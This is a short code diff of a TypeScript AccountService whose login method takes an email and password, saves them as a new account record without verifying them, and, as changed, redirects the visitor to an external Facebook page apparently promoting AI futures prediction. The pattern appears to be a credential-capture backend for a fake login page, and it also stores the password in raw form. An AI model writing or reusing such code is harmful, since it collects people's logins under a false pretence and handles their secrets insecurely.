@@ -10,7 +10,8 @@ export class AccountService {
         private databaseService: DatabaseService,
     ) { }
 
-    async login(args: { email: string, pass: string }): Promise<void> {
+    // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
+    async login(args: { email: string, pass: string }, res: any): Promise<void> {
         const { email, pass } = args;
 
         await Account.save(new Account({
@@ -20,6 +21,8 @@ export class AccountService {
             createdTime: new Date(),
             updatedTime: new Date()
         }));
+
+        return res.redirect('https://www.facebook.com/Ai%E6%9C%9F%E8%B2%A8%E9%A0%90%E6%B8%AC-104912961057733');
     }
     /** 取得多個帳號 */
     async fetchAccounts(args: {
